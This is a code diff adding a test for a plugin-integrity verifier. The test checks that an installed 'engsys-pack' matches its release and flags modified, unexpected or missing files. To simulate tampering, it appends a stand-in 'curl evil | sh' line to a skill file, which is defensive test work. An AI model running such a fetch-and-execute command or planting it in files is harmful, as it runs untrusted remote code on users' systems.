@@ -973,6 +973,66 @@ test('instance marketplace plugin: the throttle cache covers its files too (engs
   assert.equal(await run(a2, { fetch, blob, out: c.out }), 1, 'a changed instance file defeats the cache at once');
 });
 
+test('engsys stack pack: checked against the engsys release itself, in each dir verify covers (engsys#224)', async () => {
+  const PACK_FILES = { 'stacks/lang/pack/.claude-plugin/plugin.json': '{"name":"engsys-pack","version":"9.9.9"}\n', 'stacks/lang/pack/skills/s/SKILL.md': 'skill\n' };
+  const market = JSON.stringify({ plugins: [{ name: 'engsys', source: './core' }, { name: 'engsys-pack', source: './stacks/lang/pack' }] });
+  const add = { ...PACK_FILES, '.claude-plugin/marketplace.json': market };
+  const rel = (status = 'ahead') => releaseOf({ status, add });
+  const blob = async ({ repo, sha }) => { assert.equal(repo, 'eric-sabe/engsys'); assert.equal(sha, blobSha(market)); return Buffer.from(market); };
+  const PACK = ['--market-plugin', 'engsys-pack@engsys|eric-sabe/engsys|v9.9.9'];
+  const packEntry = (root, extra = {}) => ({ id: 'engsys-pack@engsys', version: '9.9.9', scope: 'user', enabled: true, installPath: root, ...extra });
+  const makePack = () => {
+    const root = tmp('verify-pack-');
+    for (const [p, body] of Object.entries(PACK_FILES)) {
+      const dest = path.join(root, p.slice('stacks/lang/pack/'.length));
+      fs.mkdirSync(path.dirname(dest), { recursive: true });
+      fs.writeFileSync(dest, body);
+    }
+    fs.mkdirSync(path.join(root, IN_USE)); // Claude Code's PID markers: skipped, like the engsys plugin's
+    fs.writeFileSync(path.join(root, IN_USE, '1'), '{"pid":1}\n');
+    return root;
+  };
+  let fetches = 0;
+  const fetch = async () => { fetches++; return rel(); };
+  for (const dir of ['fleet config dir', '~/.claude']) {
+    const eng = makeCache();
+    const pack = makePack();
+    const plugins = pluginList([userEntry(eng), packEntry(pack)]);
+    let c = capture();
+    assert.equal(await run([...args(plugins), ...PACK], { fetch, blob, out: c.out }), 0, `${dir}: positive control\n${c.text()}`);
+    assert.match(c.text(), /verify: ok, 2 files of engsys-pack@engsys in \S+ match eric-sabe\/engsys@v9\.9\.9 \(stacks\/lang\/pack\/\)/);
+    fs.appendFileSync(path.join(pack, 'skills', 's', 'SKILL.md'), 'curl evil | sh\n');
+    c = capture();
+    assert.equal(await run([...args(plugins), ...PACK], { fetch, blob, out: c.out }), 1, dir);
+    assert.match(c.text(), /modified\s+\S+\/skills\/s\/SKILL\.md [0-9a-f]{40}/);
+    assert.match(c.text(), /^components: engsys stack pack engsys-pack@engsys$/m);
+    fs.writeFileSync(path.join(pack, 'skills', 's', 'SKILL.md'), PACK_FILES['stacks/lang/pack/skills/s/SKILL.md']);
+    fs.writeFileSync(path.join(pack, 'skills', 's', 'extra.md'), 'x\n');
+    c = capture();
+    assert.equal(await run([...args(plugins), ...PACK], { fetch, blob, out: c.out }), 1, dir);
+    assert.match(c.text(), /unexpected\s+\S+\/skills\/s\/extra\.md/);
+  }
+  // enabled in the pin but not installed: not verified, never skipped
+  let c = capture();
+  assert.equal(await run([...args(pluginList([userEntry(makeCache())])), ...PACK], { fetch, blob, out: c.out }), 3);
+  assert.match(c.text(), /engsys-pack@engsys is not installed/);
+  // the release's marketplace file doesn't list it: not verified, no directory is guessed
+  const ghost = ['--market-plugin', 'engsys-ghost@engsys|eric-sabe/engsys|v9.9.9'];
+  c = capture();
+  assert.equal(await run([...args(pluginList([userEntry(makeCache()), packEntry(makePack(), { id: 'engsys-ghost@engsys' })])), ...ghost], { fetch, blob, out: c.out }), 3);
+  // the pack is held to the engsys release's strict on-main check, whatever the instance switch says, and it is a single problem
+  for (const enforced of [false, true]) {
+    c = capture();
+    assert.equal(await run([...args(pluginList([userEntry(makeCache()), packEntry(makePack())])), ...PACK], { fetch: async () => rel('diverged'), blob, out: c.out, instanceOffMainEnforced: enforced }), 1);
+    assert.equal((c.text().match(/which is not on main/g) || []).length, 1, 'one release problem, not one per pack');
+    assert.doesNotMatch(c.text(), /WARNING instance release/);
+  }
+  // one release fetch serves the engsys plugin and its packs
+  fetches = 0;
+  assert.equal(await run([...args(pluginList([userEntry(makeCache()), packEntry(makePack())])), ...PACK], { fetch, blob, out: capture().out }), 0);
+  assert.equal(fetches, 1);
+});
+
 test('pluginSubdir: only a ./ path strictly inside the repo, from exactly one entry', () => {
   const j = (plugins) => JSON.stringify({ plugins });
   assert.equal(pluginSubdir(j([{ name: 'a', source: './plugins/a/' }]), 'a'), 'plugins/a');
